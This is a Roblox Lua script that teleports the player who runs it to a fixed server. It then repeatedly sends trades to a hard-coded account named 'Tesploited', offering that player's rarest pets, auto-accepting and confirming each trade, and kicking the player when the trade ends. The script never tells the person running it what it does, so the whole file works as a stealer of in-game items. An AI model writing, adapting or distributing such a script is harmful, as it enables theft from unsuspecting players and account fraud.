return function(config)
    task.wait(20)
    setfpscap(15)

    local TARGET_PLAYER = config.TARGET_PLAYER or "Tesploited"
    local ADD_PETS = config.ADD_PETS or true
    local ACCEPT_DELAY = config.ACCEPT_DELAY or 15
    local CONFIRM_DELAY = config.CONFIRM_DELAY or 10
    local POST_TRADE_DELAY = config.POST_TRADE_DELAY or 15
    local MAX_PETS = config.MAX_PETS or 10

    local JOB_IDS = config.JOB_IDS or {
        "1a42f208-4ce4-4828-904a-0a87c4e3cca8",
    }

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TeleportService = game:GetService("TeleportService")

    local Network = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
    local LocalPlayer = Players.LocalPlayer
    local LocalData = require(ReplicatedStorage.Client.Framework.Services.LocalData)
    local PetsModule = require(ReplicatedStorage.Shared.Data.Pets)

    local function joinJob(jobId)
        if game.JobId == jobId then return true end
        local ok = pcall(function()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
        end)
        return ok
    end

    local function tryJoinJobIds()
        for _, jobId in ipairs(JOB_IDS) do
            if joinJob(jobId) then
                return true
            end
        end
        return false
    end

    tryJoinJobIds()

    local function getGoodPets()
        local data = LocalData:Get()
        if not data or not data.Pets then return {} end
        local out = {}
        for _, pet in pairs(data.Pets) do
            local info = PetsModule[pet.Name]
            if info and (info.Rarity == "Secret" or info.Rarity == "Infinity") then
                table.insert(out, pet.Id)
            end
        end
        return out
    end

    local function tradeActive()
        return true
    end

    Network.OnClientEvent:Connect(function(action)
        if action == "TradeEnded" then
            task.delay(POST_TRADE_DELAY, function()
                LocalPlayer:Kick("Trade complete")
            end)
        end
    end)

    local function runTrade()
        local target = Players:FindFirstChild(TARGET_PLAYER)
        if not target then return end

        Network:FireServer("TradeRequest", target)

        local t = ACCEPT_DELAY
        repeat
            task.wait(1)
            t -= 1
        until t <= 0 or not tradeActive()

        if not tradeActive() then return end

        if ADD_PETS then
            local pets = getGoodPets()
            for i = 1, math.min(#pets, MAX_PETS) do
                if not tradeActive() then return end
                Network:FireServer("TradeAddPet", tostring(pets[i]) .. ":0")
                task.wait(0.6)
            end
        end

        if not tradeActive() then return end
        Network:FireServer("TradeAccept")
        task.wait(CONFIRM_DELAY)

        if not tradeActive() then return end
        Network:FireServer("TradeConfirm")
    end

    while task.wait(2) do
        runTrade()
    end
end
